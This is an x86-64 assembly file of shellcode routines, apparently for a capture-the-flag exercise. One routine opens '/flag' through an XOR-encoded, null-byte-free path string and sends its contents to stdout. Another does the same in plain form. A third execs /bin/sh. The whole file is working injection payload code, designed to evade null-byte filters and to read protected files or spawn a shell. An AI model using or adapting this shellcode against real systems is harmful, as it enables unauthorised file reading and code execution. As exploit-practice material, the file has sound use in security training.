jmp read_flag_no_null_byte
flag_enc:   #.string "/flag"
        .byte 0xd0,0x99,0x93,0x9e,0x98,0xff
        .byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
.align 32
read_flag_no_null_byte:
        push    rbp
        mov     rbp, rsp
        mov     eax, 0xcafebabe
        mov     rax, [rip+flag_enc]
        xor     rax, 0xffffffffffffffff
        push    rax

        xor     rax, rax
        mov     al, 0x02  # syscall name # lea     rdi, [rbp] # string pffset
        mov     rdi, rsp
        xor     rsi, rsi  # flag
        xor     rdx, rdx  # flag
        syscall

        xor     rdi, rdi
        mov     dil, 0x01 # rdi = stdout
        mov     rsi, rax # rsi = fd_flag
        xor     rdx, rdx # rdx = offset in bytes = 0
        xor     r10, r10 # r10 = length to read = 1024
        mov     r10w, 1023 # r10 = length to read = 1024
        add     r10w, 1
        xor     rax, rax # rax = syscall for sendfile
        mov     al, 40 # rax = syscall for sendfile
        syscall

        pop     rax
        pop     rbp
        ret

read_flag:
        push    rbp
        mov     rbp, rsp

        mov     rax, 2  # syscall name
        lea     rdi, [rip+flag] # string pffset
        mov     rsi, 0  # flag
        mov     rdx, 0  # flag
        syscall

        mov     rdi, 1 # rdi = stdout
        mov     rsi, rax # rsi = fd_flag
        mov     rdx, 0 # rdx = offset in bytes = 0
        mov     r10, 1024 # r10 = length to read = 1024
        mov     rax, 40 # rax = syscall for sendfile
        syscall

        pop     rbp
        ret

flag:
        .string "/flag"

spawn_shell:
        push    rbp
        mov     rbp, rsp
        
        mov rax, 59
        lea rdi, [rip+shell]
        mov rsi, 0
        mov rdx, 0
        syscall


        pop     rbp
        ret
shell:
        .string "/bin/sh"